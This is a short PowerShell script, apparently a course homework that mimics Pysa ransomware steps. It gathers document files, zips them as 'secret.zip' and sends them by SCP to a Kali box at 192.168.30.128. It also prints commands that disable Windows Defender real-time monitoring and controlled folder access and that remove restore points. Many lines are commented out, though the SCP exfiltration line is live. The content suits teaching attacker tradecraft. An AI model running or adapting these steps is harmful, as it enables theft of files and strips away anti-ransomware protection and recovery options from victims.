
# Create and export a list of docx, pdf, txt, and xlsx files to files.csv
#Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Week14\homework\Documents | Export-Csv -Path .\Week14\homework\files.csv

# Import the files.csv file
#$fileList = Import-Csv -Path .\Week14\homework\files.csv -Header FullName

# Copy files to remote host (bridged Kali box)
#foreach ($f in $fileList) {
#  Copy-Item $f.FullName -Destination .\Week14\homework\TopSecretDocs
#}


# Zip new folder called TopSecretDocs
#Compress-Archive -Path .\Week14\homework\TopSecretDocs -DestinationPath .\Week14\homework\secret.zip

# SCP secret.zip to remote machine (bridged Kali box)
Set-SCPItem -ComputerName "192.168.30.128" -Credential (Get-Credential user) -Port "22" -Destination "/home/user/Desktop" -Path ".\Week14\homework\secret.zip"

# Disable Windows Defender and disable controlled folder access
Write-Host 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableControlledFolderAccess Enabled'

<#
What is Defender Controlled Folder Access?
This is a security feature in Windows 10 that protects your files and folders from malicious software (like ransomware)

What behavior of Pysa would cause Controlled Folder Access to trigger?
When Pysa starts encrypting your files, and deleting the old non-encrypted versions
#>

# cmdlet to delte volume shadow copies and restore points
Write-Host 'Clear-ComputerRestorePoint'